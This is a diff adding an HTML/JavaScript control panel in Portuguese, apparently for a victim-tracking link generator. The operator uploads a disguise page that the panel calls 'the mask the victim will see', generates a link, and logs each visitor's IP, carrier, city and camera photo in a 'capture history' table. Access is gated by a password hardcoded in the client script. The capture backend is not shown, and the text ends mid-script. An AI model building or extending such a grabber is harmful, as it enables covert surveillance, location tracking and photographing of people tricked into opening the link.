@@ -1,0 +1,499 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Orbit • Painel de configurações</title>
+  <style>
+    :root {
+      --bg-page: #0d1117;
+      --bg-sidebar: #111821;
+      --bg-card: #151e29;
+      --bg-soft: rgba(255,255,255,.045);
+      --border-color: rgba(148,163,184,.18);
+      --text-main: #f8fafc;
+      --text-muted: #94a3b8;
+      --accent: #8b5cf6;
+      --accent-strong: #a78bfa;
+      --accent-text: #fff;
+      --success: #34d399;
+      --shadow: 0 20px 55px rgba(0,0,0,.22);
+      --radius: 18px;
+      --font-scale: 1;
+    }
+
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    html { scroll-behavior: smooth; }
+    body {
+      min-height: 100vh;
+      font-family: Inter, ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+      font-size: calc(16px * var(--font-scale));
+      color: var(--text-main);
+      background:
+        radial-gradient(circle at 75% 0%, color-mix(in srgb, var(--accent) 18%, transparent), transparent 30%),
+        var(--bg-page);
+      display: flex;
+      transition: background .25s ease, color .25s ease, font-size .2s ease;
+    }
+
+    body.locked { overflow: hidden; }
+    .login-screen { position: fixed; inset: 0; z-index: 20; display: grid; place-items: center; padding: 24px; background: radial-gradient(circle at 50% 0%, color-mix(in srgb, var(--accent) 24%, transparent), transparent 42%), #090b10; }
+    .login-box { width: min(420px, 100%); padding: 34px; border: 1px solid var(--border-color); border-radius: 24px; background: linear-gradient(145deg, color-mix(in srgb, var(--bg-card) 98%, transparent), color-mix(in srgb, var(--bg-card) 78%, var(--accent) 7%)); box-shadow: 0 28px 80px rgba(0,0,0,.42); text-align: center; animation: fadeIn .35s ease; }
+    .login-logo { width: 58px; height: 58px; margin: 0 auto 20px; display: grid; place-items: center; border-radius: 18px; color: var(--accent-text); background: linear-gradient(135deg, var(--accent), var(--accent-strong)); box-shadow: 0 10px 30px color-mix(in srgb, var(--accent) 30%, transparent); font-size: 1.45rem; font-weight: 900; }
+    .login-box h2 { margin-bottom: 8px; font-size: 1.35rem; }
+    .login-box p { margin-bottom: 22px; color: var(--text-muted); font-size: .86rem; line-height: 1.5; }
+    .password-field { position: relative; margin-bottom: 12px; }
+    .password-field input { width: 100%; padding: 13px 44px 13px 14px; border: 1px solid var(--border-color); border-radius: 12px; color: var(--text-main); background: var(--bg-soft); text-align: center; letter-spacing: .08em; }
+    .password-toggle { position: absolute; right: 10px; top: 50%; transform: translateY(-50%); color: var(--text-muted); background: transparent; cursor: pointer; }
+    .login-submit { width: 100%; padding: 13px; border-radius: 12px; color: var(--accent-text); background: linear-gradient(135deg, var(--accent), var(--accent-strong)); font-weight: 800; cursor: pointer; transition: .2s ease; border: none; }
+    .login-submit:hover { transform: translateY(-2px); filter: brightness(1.08); }
+    .login-error { min-height: 20px; margin-top: 12px; color: #fb7185; font-size: .78rem; }
+    .login-screen.hidden { display: none; }
+
+    button, input, select { font: inherit; }
+    button { border: 0; }
+    button:focus-visible, input:focus-visible, select:focus-visible { outline: 3px solid color-mix(in srgb, var(--accent) 45%, transparent); outline-offset: 3px; }
+
+    .sidebar {
+      width: 248px;
+      min-height: 100vh;
+      flex-shrink: 0;
+      padding: 22px 14px;
+      background: color-mix(in srgb, var(--bg-sidebar) 94%, transparent);
+      border-right: 1px solid var(--border-color);
+      display: flex;
+      flex-direction: column;
+      gap: 28px;
+      transition: width .25s ease, background .25s ease;
+    }
+
+    .brand { display: flex; align-items: center; gap: 11px; padding: 0 10px; }
+    .brand-mark { display: grid; place-items: center; width: 38px; height: 38px; padding: 3px; border-radius: 13px; color: var(--accent-text); background: linear-gradient(135deg, var(--accent), var(--accent-strong)); box-shadow: 0 8px 22px color-mix(in srgb, var(--accent) 28%, transparent); font-size: .68rem; font-weight: 900; text-align: center; line-height: 1.05; overflow: hidden; }
+    .brand strong { font-size: 1rem; letter-spacing: .02em; }
+    .brand small { display: block; color: var(--text-muted); font-size: .72rem; margin-top: 2px; }
+
+    .nav-title { padding: 0 12px 8px; color: var(--text-muted); text-transform: uppercase; font-size: .68rem; font-weight: 800; letter-spacing: .13em; }
+    .nav-list { display: grid; gap: 6px; }
+    .nav-btn { width: 100%; display: flex; align-items: center; gap: 12px; padding: 12px; border-radius: 12px; color: var(--text-muted); background: transparent; cursor: pointer; text-align: left; transition: .2s ease; border: none; }
+    .nav-btn:hover { color: var(--text-main); background: var(--bg-soft); transform: translateX(2px); }
+    .nav-btn.active { color: var(--text-main); background: linear-gradient(90deg, color-mix(in srgb, var(--accent) 24%, transparent), transparent); box-shadow: inset 3px 0 var(--accent); }
+    .nav-icon { width: 20px; text-align: center; font-size: 1.05rem; }
+    .sidebar-footer { margin-top: auto; padding: 14px; border: 1px solid var(--border-color); border-radius: 15px; background: var(--bg-soft); color: var(--text-muted); font-size: .76rem; line-height: 1.5; }
+    .status-dot { display: inline-block; width: 7px; height: 7px; margin-right: 6px; border-radius: 50%; background: var(--success); box-shadow: 0 0 0 4px color-mix(in srgb, var(--success) 15%, transparent); }
+
+    .main-wrapper { min-width: 0; flex: 1; }
+    .top-bar { position: sticky; top: 0; z-index: 4; min-height: 76px; padding: 16px clamp(18px, 4vw, 50px); border-bottom: 1px solid var(--border-color); background: color-mix(in srgb, var(--bg-page) 82%, transparent); backdrop-filter: blur(18px); display: flex; align-items: center; justify-content: space-between; gap: 20px; }
+    .eyebrow { color: var(--accent-strong); font-size: .72rem; text-transform: uppercase; letter-spacing: .14em; font-weight: 800; margin-bottom: 3px; }
+    .top-bar h1 { font-size: clamp(1.15rem, 2vw, 1.5rem); letter-spacing: -.03em; }
+    .configured-identity { color: var(--text-muted); font-size: .72rem; margin-top: 4px; }
+    .top-actions { display: flex; align-items: center; gap: 10px; }
+    .save-badge { color: var(--success); border: 1px solid color-mix(in srgb, var(--success) 30%, transparent); background: color-mix(in srgb, var(--success) 10%, transparent); border-radius: 999px; padding: 7px 11px; font-size: .75rem; white-space: nowrap; }
+    .avatar { width: 36px; height: 36px; border-radius: 50%; display: grid; place-items: center; font-weight: 800; color: var(--accent-text); background: linear-gradient(135deg, var(--accent), #ec4899); }
+
+    .content { width: min(1120px, 100%); padding: 34px clamp(18px, 4vw, 50px) 60px; }
+    .section { display: none; animation: fadeIn .25s ease; }
+    .section.active { display: block; }
+    @keyframes fadeIn { from { opacity: 0; transform: translateY(7px); } to { opacity: 1; transform: translateY(0); } }
+    .hero { margin-bottom: 26px; }
+    .hero h2 { font-size: clamp(1.45rem, 3vw, 2.1rem); letter-spacing: -.045em; margin-bottom: 8px; }
+    .hero p { color: var(--text-muted); max-width: 680px; line-height: 1.6; }
+    .settings-layout { display: grid; grid-template-columns: minmax(0, 1fr) 280px; gap: 20px; align-items: start; }
+    .card { padding: 22px; margin-bottom: 18px; border: 1px solid var(--border-color); border-radius: var(--radius); background: linear-gradient(145deg, color-mix(in srgb, var(--bg-card) 96%, transparent), color-mix(in srgb, var(--bg-card) 82%, var(--accent) 4%)); box-shadow: var(--shadow); }
+    .card-header { display: flex; align-items: flex-start; justify-content: space-between; gap: 16px; margin-bottom: 18px; }
+    .card h3 { font-size: 1rem; margin-bottom: 5px; }
+    .card-description { color: var(--text-muted); font-size: .84rem; line-height: 1.5; }
+    .section-label { margin: 28px 0 10px; color: var(--text-muted); font-size: .72rem; font-weight: 800; letter-spacing: .12em; text-transform: uppercase; }
+
+    .themes-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(155px, 1fr)); gap: 10px; }
+    .theme-option { position: relative; overflow: hidden; min-height: 92px; padding: 13px; border: 1px solid var(--border-color); border-radius: 14px; color: var(--text-main); background: var(--bg-soft); text-align: left; cursor: pointer; transition: .2s ease; }
+    .theme-option::before { content: ""; position: absolute; inset: 0 0 auto; height: 38px; background: linear-gradient(135deg, var(--theme-bg), var(--theme-accent)); opacity: .8; }
+    .theme-option:hover { transform: translateY(-3px); border-color: var(--theme-accent); }
+    .theme-option.selected { border-color: var(--theme-accent); box-shadow: 0 0 0 2px color-mix(in srgb, var(--theme-accent) 22%, transparent); }
+    .theme-name { position: absolute; left: 13px; bottom: 13px; font-size: .82rem; font-weight: 700; }
+    .theme-check { position: absolute; right: 10px; bottom: 10px; color: var(--theme-accent); font-weight: 900; }
+
+    .form-grid { display: grid; grid-template-columns: repeat(2, minmax(0, 1fr)); gap: 13px; }
+    .field { display: grid; gap: 8px; }
+    .field label { color: var(--text-muted); font-size: .78rem; font-weight: 700; }
+    select, input[type="text"], input[type="file"] { width: 100%; padding: 11px 12px; border: 1px solid var(--border-color); border-radius: 11px; color: var(--text-main); background: var(--bg-soft); cursor: pointer; }
+    select option { background: var(--bg-card); }
+    .color-row { display: flex; gap: 10px; flex-wrap: wrap; }
+    .color-picker-box { flex: 1; min-width: 180px; display: flex; align-items: center; justify-content: space-between; gap: 10px; padding: 10px 12px; border: 1px solid var(--border-color); border-radius: 11px; background: var(--bg-soft); color: var(--text-muted); font-size: .8rem; }
+    input[type="color"] { width: 35px; height: 30px; border: 0; padding: 0; border-radius: 8px; background: transparent; cursor: pointer; }
+    input[type="range"] { width: 100%; accent-color: var(--accent); cursor: pointer; }
+    .range-line { display: flex; justify-content: space-between; align-items: center; color: var(--text-muted); font-size: .78rem; }
+    .range-value { color: var(--text-main); font-weight: 800; }
+
+    .toggle-row { display: flex; align-items: center; justify-content: space-between; gap: 16px; padding: 13px 0; border-bottom: 1px solid var(--border-color); }
+    .toggle-row:last-child { border-bottom: 0; padding-bottom: 0; }
+    .toggle-copy strong { display: block; font-size: .88rem; margin-bottom: 3px; }
+    .toggle-copy span { color: var(--text-muted); font-size: .77rem; line-height: 1.4; }
+    .switch { position: relative; width: 44px; height: 25px; flex-shrink: 0; }
+    .switch input { opacity: 0; width: 0; height: 0; }
+    .slider { position: absolute; inset: 0; border-radius: 999px; background: #334155; cursor: pointer; transition: .2s; }
+    .slider::before { content: ""; position: absolute; width: 19px; height: 19px; left: 3px; top: 3px; border-radius: 50%; background: #fff; transition: .2s; }
+    .switch input:checked + .slider { background: var(--accent); }
+    .switch input:checked + .slider::before { transform: translateX(19px); }
+
+    .quick-card { position: sticky; top: 100px; }
+    .profile { display: flex; align-items: center; gap: 11px; padding-bottom: 17px; margin-bottom: 14px; border-bottom: 1px solid var(--border-color); }
+    .profile-avatar { width: 43px; height: 43px; display: grid; place-items: center; border-radius: 13px; color: var(--accent-text); background: linear-gradient(135deg, var(--accent), #ec4899); font-weight: 900; }
+    .profile-avatar img, .avatar img { width: 100%; height: 100%; border-radius: inherit; object-fit: cover; display: block; }
+    .photo-upload { display: flex; align-items: center; gap: 14px; padding: 14px; border: 1px dashed var(--border-color); border-radius: 14px; background: var(--bg-soft); }
+    .photo-preview { width: 64px; height: 64px; display: grid; place-items: center; flex-shrink: 0; overflow: hidden; border-radius: 18px; color: var(--accent-text); background: linear-gradient(135deg, var(--accent), #ec4899); font-size: 1.25rem; font-weight: 900; }
+    .photo-preview img { width: 100%; height: 100%; object-fit: cover; }
+    .photo-actions { display: flex; flex-wrap: wrap; gap: 8px; margin-top: 8px; }
+    .file-label { display: inline-flex; align-items: center; padding: 8px 11px; border-radius: 9px; color: var(--accent-text); background: var(--accent); font-size: .76rem; font-weight: 800; cursor: pointer; }
+    .file-label input { display: none; }
+    .remove-photo { padding: 8px 11px; border: 1px solid var(--border-color); border-radius: 9px; color: var(--text-main); background: transparent; font-size: .76rem; cursor: pointer; }
+    .profile strong { display: block; font-size: .9rem; }
+    .profile span { color: var(--text-muted); font-size: .75rem; }
+    .summary-list { display: grid; gap: 12px; }
+    .summary-item { display: flex; justify-content: space-between; gap: 10px; color: var(--text-muted); font-size: .78rem; }
+    .summary-item strong { color: var(--text-main); text-align: right; }
+    .button-row { display: flex; gap: 9px; margin-top: 17px; }
+    .btn { flex: 1; padding: 11px 13px; border-radius: 11px; font-size: .8rem; font-weight: 800; cursor: pointer; transition: .2s ease; border: none; }
+    .btn-primary { color: var(--accent-text); background: linear-gradient(135deg, var(--accent), var(--accent-strong)); }
+    .btn-secondary { color: var(--text-main); border: 1px solid var(--border-color); background: var(--bg-soft); }
+    .btn:hover { transform: translateY(-2px); filter: brightness(1.08); }
+    .notice { margin-top: 13px; padding: 11px; border-radius: 11px; color: var(--text-muted); background: var(--bg-soft); font-size: .74rem; line-height: 1.5; }
+
+    /* Estilos da Tabela de Capturas */
+    table { width: 100%; border-collapse: collapse; margin-top: 15px; text-align: left; font-size: 0.85rem; }
+    th { border-bottom: 1px solid var(--border-color); color: var(--text-muted); padding: 10px; font-weight: 600; }
+    td { padding: 10px; border-bottom: 1px solid rgba(255,255,255,0.05); vertical-align: middle; }
+    .img-ft { width: 50px; height: 50px; object-fit: cover; border-radius: 8px; border: 1px solid var(--border-color); }
+    .ip-text { color: var(--accent); font-family: monospace; font-size: 0.9rem; font-weight: bold; }
+    .operadora-text { font-size: 0.7rem; color: var(--text-muted); }
+
+    @media (max-width: 850px) {
+      .sidebar { width: 76px; padding: 18px 9px; }
+      .brand { justify-content: center; padding: 0; }
+      .brand-copy, .nav-title, .nav-btn span:not(.nav-icon), .sidebar-footer { display: none; }
+      .nav-btn { justify-content: center; padding: 13px 8px; }
+      .settings-layout { grid-template-columns: 1fr; }
+      .quick-card { position: static; }
+    }
+    @media (max-width: 560px) {
+      .top-bar { align-items: flex-start; }
+      .save-badge { display: none; }
+      .content { padding-top: 25px; }
+      .form-grid { grid-template-columns: 1fr; }
+      .card { padding: 17px; border-radius: 15px; }
+      .themes-grid { grid-template-columns: repeat(2, minmax(0, 1fr)); }
+    }
+
+    body.compact .card { padding: 16px; margin-bottom: 12px; }
+    body.no-animations *, body.no-animations *::before, body.no-animations *::after { transition: none !important; animation: none !important; scroll-behavior: auto !important; }
+  </style>
+</head>
+<body>
+  <div class="login-screen" id="login-screen">
+    <div class="login-box">
+      <div class="login-logo">O</div>
+      <h2>Acesso protegido</h2>
+      <p>Digite sua senha para entrar no painel de controle.</p>
+      <form id="login-form">
+        <div class="password-field"><input id="password-input" type="password" placeholder="Digite sua senha" autocomplete="current-password" autofocus /><button class="password-toggle" id="password-toggle" type="button" aria-label="Mostrar senha">◉</button></div>
+        <button class="login-submit" type="submit">Entrar no painel</button>
+        <div class="login-error" id="login-error" aria-live="polite"></div>
+      </form>
+    </div>
+  </div>
+  <aside class="sidebar">
+    <div class="brand"><div class="brand-mark" id="brand-ft">FT</div><div class="brand-copy"><strong>ORBIT PANEL</strong><small>Painel de controle</small></div></div>
+    <div>
+      <div class="nav-title">Navegação</div>
+      <nav class="nav-list" aria-label="Navegação principal">
+        <button class="nav-btn active" data-target="ipft"><span class="nav-icon">◈</span><span>IP + <b id="nav-ft-name">FT principal</b></span></button>
+        <button class="nav-btn" data-target="ft"><span class="nav-icon">▣</span><span>FT — <b id="nav-ft-only">FT principal</b></span></button>
+        <button class="nav-btn" data-target="ip"><span class="nav-icon">⌁</span><span>IP</span></button>
+        <button class="nav-btn" data-target="settings"><span class="nav-icon">⚙</span><span>Configurações</span></button>
+      </nav>
+    </div>
+    <div class="sidebar-footer"><span class="status-dot"></span>Preferências sincronizadas<br><small>Alterações salvas neste dispositivo</small></div>
+  </aside>
+
+  <div class="main-wrapper">
+    <header class="top-bar">
+      <div><div class="eyebrow">Área de controle</div><h1 id="page-title">Gerador</h1><div class="configured-identity" id="configured-identity">Meu painel • FT principal</div></div>
+      <div class="top-actions"><span class="save-badge" id="save-status">● Salvo agora</span><div class="avatar" id="top-avatar">GG</div></div>
+    </header>
+
+    <main class="content">
+      <!-- ABA 1: GERADOR E TABELA -->
+      <section class="section active" id="ipft">
+        <div class="hero"><h2>IP + <span id="ipft-title">FT principal</span></h2><p>Gere seus links e acompanhe as capturas.</p></div>
+        
+        <div class="card">
+          <h3>Gerar Novo Link</h3>
+          <div class="form-grid">
+            <div class="field">
+              <label>Tipo de Captura</label>
+              <select id="tipo-link">
+                <option value="ip">Apenas IP (Mostra HTML, sem foto)</option>
+                <option value="ft">IP + Foto (Mostra HTML e tira foto)</option>
+              </select>
+            </div>
+            <div class="field">
+              <label>Nome da FT (Identificação)</label>
+              <input type="text" id="ft-nome" placeholder="Ex: Insta do João" />
+            </div>
+          </div>
+          <div class="form-grid">
+            <div class="field" style="grid-column: 1 / -1;">
+              <label>Arquivo HTML (Máscara que a vítima vai ver)</label>
+              <input type="file" id="ft-html" accept=".html" />
+            </div>
+          </div>
+          <button class="btn btn-primary" id="btn-gerar" style="width: auto; padding: 10px 20px; margin-top: 15px;">Gerar Link</button>
+          
+          <div id="link-gerado-box" style="display:none; margin-top: 15px; background: rgba(0,0,0,0.3); padding: 10px; border-radius: 8px;">
+            <p style="font-size: 0.8rem; color: #aaa;">Link gerado! Copie e envie:</p>
+            <input type="text" id="link-gerado" readonly style="width: 100%; background: transparent; border: none; color: var(--success); font-weight: bold; margin-top: 5px;" />
+          </div>
+        </div>
+
+        <div class="card">
+          <h3>Histórico de Capturas</h3>
+          <div style="overflow-x: auto;">
+            <table>
+              <thead>
+                <tr>
+                  <th>Foto (FT)</th>
+                  <th>IP / Operadora</th>
+                  <th>Local (Cidade/Estado)</th>
+                  <th>Nome FT</th>
+                  <th>Data</th>
+                </tr>
+              </thead>
+              <tbody id="tabela-ips"></tbody>
+            </table>
+          </div>
+        </div>
+      </section>
+
+      <!-- ABA 2: FT -->
+      <section class="section" id="ft"><div class="hero"><h2>FT — <span id="ft-title">FT principal</span></h2><p>Acesse diretamente a área da FT escolhida nas configurações.</p></div><div class="card"><h3>Área FT</h3><p class="card-description">Este espaço está pronto para receber os dados e ferramentas específicas da sua FT.</p></div></section>
+      
+      <!-- ABA 3: IP -->
+      <section class="section" id="ip"><div class="hero"><h2>IP</h2><p>Consulte as informações do módulo IP com a mesma experiência visual do painel.</p></div><div class="card"><h3>Área em preparação</h3><p class="card-description">Adicione aqui tabelas, gráficos ou ferramentas específicas do seu fluxo de trabalho.</p></div></section>
+
+      <!-- ABA 4: CONFIGURAÇÕES -->
+      <section class="section" id="settings">
+        <div class="hero"><h2>Personalize sua experiência</h2><p>Ajuste a aparência, o comportamento e as preferências do painel. Todas as alterações ficam salvas automaticamente neste navegador.</p></div>
+        <div class="settings-layout">
+          <div>
+            <div class="card">
+              <div class="card-header"><div><h3>Foto do perfil</h3><p class="card-description">Escolha uma foto do seu celular para personalizar o painel.</p></div><span class="eyebrow">Perfil</span></div>
+              <div class="photo-upload"><div class="photo-preview" id="photo-preview">GG</div><div><strong>Imagem do perfil</strong><p class="card-description">JPG, PNG ou WEBP de até 2 MB.</p><div class="photo-actions"><label class="file-label">Escolher foto<input type="file" id="photo-input" accept="image/png,image/jpeg,image/webp" /></label><button class="remove-photo" id="remove-photo" type="button">Remover</button></div></div></div>
+            </div>
+
+            <div class="card">
+              <div class="card-header"><div><h3>Identificação do painel</h3><p class="card-description">Configure o nome que aparecerá no painel. A FT escolhida fica no logotipo ao lado.</p></div><span class="eyebrow">Dados principais</span></div>
+              <div class="form-grid"><div class="field"><label for="panel-name">Nome do painel</label><input type="text" id="panel-name" placeholder="Ex.: Central do João" maxlength="40" /></div></div>
+            </div>
+
+            <div class="card">
+              <div class="card-header"><div><h3>Temas rápidos</h3><p class="card-description">Escolha uma identidade visual pronta para o seu painel.</p></div><span class="eyebrow">Aparência</span></div>
+              <div class="themes-grid" id="themes-grid"></div>
+            </div>
+
+            <div class="card">
+              <div class="card-header"><div><h3>Personalização avançada</h3><p class="card-description">Monte sua própria combinação de cores e densidade.</p></div></div>
+              <div class="color-row"><div class="color-picker-box"><span>Cor de fundo</span><input type="color" id="bg-picker" value="#0d1117" /></div><div class="color-picker-box"><span>Cor de destaque</span><input type="color" id="accent-picker" value="#8b5cf6" /></div></div>
+              <div class="section-label">Tamanho da interface</div>
+              <div class="range-line"><span>Compacta</span><span class="range-value" id="font-size-value">100%</span><span>Confortável</span></div>
+              <input type="range" id="font-size" min="90" max="115" value="100" step="5" />
+              <div class="section-label">Densidade dos cards</div>
+              <select id="density"><option value="comfortable">Confortável</option><option value="compact">Compacta</option></select>
+            </div>
+
+            <div class="card">
+              <div class="card-header"><div><h3>Preferências do painel</h3><p class="card-description">Defina como a interface deve se comportar no dia a dia.</p></div><span class="eyebrow">Experiência</span></div>
+              <div class="toggle-row"><div class="toggle-copy"><strong>Salvar automaticamente</strong><span>Guarda suas alterações no navegador em tempo real.</span></div><label class="switch"><input type="checkbox" id="auto-save" checked><span class="slider"></span></label></div>
+              <div class="toggle-row"><div class="toggle-copy"><strong>Animações suaves</strong><span>Transições e movimentos discretos ao navegar.</span></div><label class="switch"><input type="checkbox" id="animations" checked><span class="slider"></span></label></div>
+              <div class="toggle-row"><div class="toggle-copy"><strong>Modo de alto contraste</strong><span>Realça bordas e textos para facilitar a leitura.</span></div><label class="switch"><input type="checkbox" id="contrast"><span class="slider"></span></label></div>
+              <div class="toggle-row"><div class="toggle-copy"><strong>Notificações do sistema</strong><span>Exibe avisos quando uma preferência for alterada.</span></div><label class="switch"><input type="checkbox" id="notifications" checked><span class="slider"></span></label></div>
+            </div>
+
+            <div class="card">
+              <div class="card-header"><div><h3>Idioma e acessibilidade</h3><p class="card-description">Escolha opções que deixam o painel mais confortável para você.</p></div></div>
+              <div class="form-grid"><div class="field"><label for="language">Idioma do painel</label><select id="language"><option>Português (Brasil)</option><option>English</option><option>Español</option></select></div><div class="field"><label for="time-format">Formato de horário</label><select id="time-format"><option>24 horas</option><option>12 horas (AM/PM)</option></select></div></div>
+            </div>
+          </div>
+
+          <aside class="card quick-card">
+            <div class="profile"><div class="profile-avatar" id="profile-avatar">GG</div><div><strong>Olá, Ggrt</strong><span>Perfil local</span></div></div>
+            <h3>Resumo atual</h3>
+            <div class="summary-list" style="margin-top:16px"><div class="summary-item"><span>Nome</span><strong id="summary-name">Meu painel</strong></div><div class="summary-item"><span>FT</span><strong id="summary-ft">FT principal</strong></div><div class="summary-item"><span>Tema</span><strong id="summary-theme">Aurora Violeta</strong></div><div class="summary-item"><span>Interface</span><strong id="summary-font">100%</strong></div><div class="summary-item"><span>Densidade</span><strong id="summary-density">Confortável</strong></div><div class="summary-item"><span>Contraste</span><strong id="summary-contrast">Padrão</strong></div></div>
+            <div class="button-row"><button class="btn btn-secondary" id="reset-btn">Restaurar</button><button class="btn btn-primary" id="save-btn">Salvar</button></div>
+            <div class="notice" id="toast">Suas preferências estão sendo aplicadas automaticamente.</div>
+          </aside>
+        </div>
+      </section>
+    </main>
+  </div>
+
+  <script>
+    // --- SISTEMA DE TEMAS E CONFIGURAÇÕES ---
+    const THEMES = [
+      { name: 'Aurora Violeta', bg: '#0d1117', sidebar: '#111821', card: '#151e29', border: '#334155', accent: '#8b5cf6' },
+      { name: 'Oceano Azul', bg: '#071522', sidebar: '#091d2d', card: '#0d273b', border: '#1e4b68', accent: '#38bdf8' },
+      { name: 'Esmeralda', bg: '#071914', sidebar: '#0a211a', card: '#0e2c22', border: '#1e5945', accent: '#10b981' },
+      { name: 'Rosa Cósmico', bg: '#1d0c1a', sidebar: '#261025', card: '#351431', border: '#68325d', accent: '#f472b6' },
+      { name: 'Âmbar', bg: '#1b1308', sidebar: '#24190a', card: '#30200c', border: '#69501c', accent: '#f59e0b' },
+      { name: 'Claro Minimal', bg: '#f1f5f9', sidebar: '#e2e8f0', card: '#ffffff', border: '#cbd5e1', accent: '#2563eb' }
+    ];
+    const root = document.documentElement;
+    const $ = (id) => document.getElementById(id);
+    const ACCESS_PASSWORD = '@6292410224Ee';
+    const loginScreen = $('login-screen');
+    const loginForm = $('login-form');
+    const passwordInput = $('password-input');
+    const loginError = $('login-error');
+    
+    document.body.classList.add('locked');
+    
+    function unlockPanel() {
+      loginScreen.classList.add('hidden');
+      document.body.classList.remove('locked');
+      document.querySelector('.nav-btn[data-target="ipft"]').click();
+      carregarIPs(); // Atualiza a tabela ao logar
+    }
+    
+    loginForm.addEventListener('submit', (event) => {
+      event.preventDefault();
+      if (passwordInput.value === ACCESS_PASSWORD) { unlockPanel(); }
+      else { loginError.textContent = 'Senha incorreta. Tente novamente.'; passwordInput.select(); }
+    });
+    
+    $('password-toggle').addEventListener('click', () => { passwordInput.type = passwordInput.type === 'password' ? 'text' : 'password'; });
+    
+    const saveStatus = $('save-status');
+    let currentTheme = THEMES[0].name;
+    let currentFt = 'FT principal';
+    let currentPhoto = '';
+
+    function isLight(hex) {
+      const value = hex.replace('#', '');
+      const [r, g, b] = [0, 2, 4].map(i => parseInt(value.slice(i, i + 2), 16));
+      return (0.2126 * r + 0.7152 * g + 0.0722 * b) > 170;
+    }
+    
+    function applyTheme(theme, label = theme.name, persist = true) {
+      const light = isLight(theme.bg);
+      root.style.setProperty('--bg-page', theme.bg); root.style.setProperty('--bg-sidebar', theme.sidebar || theme.bg); root.style.setProperty('--bg-card', theme.card || theme.bg); root.style.setProperty('--border-color', theme.border || '#334155'); root.style.setProperty('--accent', theme.accent); root.style.setProperty('--accent-strong', light ? '#1d4ed8' : theme.accent); root.style.setProperty('--text-main', light ? '#172033' : '#f8fafc'); root.style.setProperty('--text-muted', light ? '#526075' : '#94a3b8'); root.style.setProperty('--accent-text', isLight(theme.accent) ? '#172033' : '#fff');
+      $('bg-picker').value = theme.bg; $('accent-picker').value = theme.accent; currentTheme = label; $('summary-theme').textContent = label; document.querySelectorAll('.theme-option').forEach(btn => btn.classList.toggle('selected', btn.dataset.theme === label));
+      if (persist) save();
+    }
+    
+    function applyPhoto(dataUrl = '') {
+      currentPhoto = dataUrl;
+      ['photo-preview', 'profile-avatar', 'top-avatar'].forEach(id => {
+        const element = $(id);
+        element.innerHTML = dataUrl ? `<img src="${dataUrl}" alt="Foto do perfil" />` : 'GG';
+      });
+    }
+    
+    function save() {
+      const state = { name: $('panel-name').value.trim() || 'Meu painel', ft: currentFt, photo: currentPhoto, theme: currentTheme, bg: $('bg-picker').value, accent: $('accent-picker').value, font: $('font-size').value, density: $('density').value, autoSave: $('auto-save').checked, animations: $('animations').checked, contrast: $('contrast').checked, notifications: $('notifications').checked, language: $('language').value, timeFormat: $('time-format').value };
+      localStorage.setItem('orbitPanelSettings', JSON.stringify(state)); saveStatus.textContent = '● Salvo agora'; $('summary-name').textContent = state.name; $('summary-ft').textContent = state.ft; $('configured-identity').textContent = `${state.name} • ${state.ft}`; $('brand-ft').textContent = state.ft; $('nav-ft-name').textContent = state.ft; $('nav-ft-only').textContent = state.ft; $('ipft-title').textContent = state.ft; $('ft-title').textContent = state.ft; $('summary-font').textContent = state.font + '%'; $('summary-density').textContent = state.density === 'compact' ? 'Compacta' : 'Confortável'; $('summary-contrast').textContent = state.contrast ? 'Alto' : 'Padrão'; $('font-size-value').textContent = state.font + '%';
+      if (state.notifications) { $('toast').textContent = 'Preferências salvas neste dispositivo.'; }
+    }
+    
+    function applyState(state) {
+      const theme = THEMES.find(t => t.name === state.theme) || THEMES[0]; applyTheme({ ...theme, bg: state.bg || theme.bg, accent: state.accent || theme.accent }, state.theme || theme.name, false);
+      currentFt = state.ft || 'FT principal'; $('panel-name').value = state.name || 'Meu painel'; applyPhoto(state.photo || ''); $('font-size').value = state.font || 100; root.style.setProperty('--font-scale', (Number($('font-size').value) / 100).toFixed(2)); $('density').value = state.density || 'comfortable'; document.body.classList.toggle('compact', $('density').value === 'compact'); $('auto-save').checked = state.autoSave !== false; $('animations').checked = state.animations !== false; $('contrast').checked = !!state.contrast; $('notifications').checked = state.notifications !== false; $('language').value = state.language || 'Português (Brasil)'; $('time-format').value = state.timeFormat || '24 horas'; document.body.classList.toggle('no-animations', !$('animations').checked); document.body.classList.toggle('high-contrast', $('contrast').checked); save();
+    }
+
+    THEMES.forEach(theme => { const btn = document.createElement('button'); btn.className = 'theme-option'; btn.dataset.theme = theme.name; btn.style.setProperty('--theme-bg', theme.bg); btn.style.setProperty('--theme-accent', theme.accent); btn.innerHTML = `<span class="theme-name">${theme.name}</span><span class="theme-check">✓</span>`; btn.addEventListener('click', () => applyTheme(theme)); $('themes-grid').appendChild(btn); });
+    $('bg-picker').addEventListener('input', () => applyTheme({ ...THEMES[0], bg: $('bg-picker').value, accent: $('accent-picker').value }, 'Personalizado'));
+    $('accent-picker').addEventListener('input', () => applyTheme({ ...THEMES[0], bg: $('bg-picker').value, accent: $('accent-picker').value }, 'Personalizado'));
+    $('panel-name').addEventListener('input', () => { if ($('auto-save').checked) save(); });
+    $('photo-input').addEventListener('change', event => { const file = event.target.files[0]; if (!file) return; if (file.size > 2 * 1024 * 1024) { $('toast').textContent = 'Essa foto é maior que 2 MB. Escolha uma imagem menor.'; event.target.value = ''; return; } const reader = new FileReader(); reader.onload = () => { applyPhoto(reader.result); save(); $('toast').textContent = 'Foto do perfil atualizada.'; }; reader.readAsDataURL(file); });
+    $('remove-photo').addEventListener('click', () => { $('photo-input').value = ''; applyPhoto(''); save(); $('toast').textContent = 'Foto removida.'; });
+    $('font-size').addEventListener('input', e => { root.style.setProperty('--font-scale', (Number(e.target.value) / 100).toFixed(2)); if ($('auto-save').checked) save(); else { $('font-size-value').textContent = e.target.value + '%'; $('summary-font').textContent = e.target.value + '%'; } });
+    ['density','auto-save','animations','contrast','notifications','language','time-format'].forEach(id => $(id).addEventListener('change', () => { if (id === 'density') document.body.classList.toggle('compact', $(id).value === 'compact'); if (id === 'animations') document.body.classList.toggle('no-animations', !$(id).checked); if (id === 'contrast') document.body.classList.toggle('high-contrast', $(id).checked); if ($('auto-save').checked || id === 'auto-save') save(); }));
+    $('save-btn').addEventListener('click', () => { save(); $('toast').textContent = 'Tudo certo! Configurações salvas com sucesso.'; });
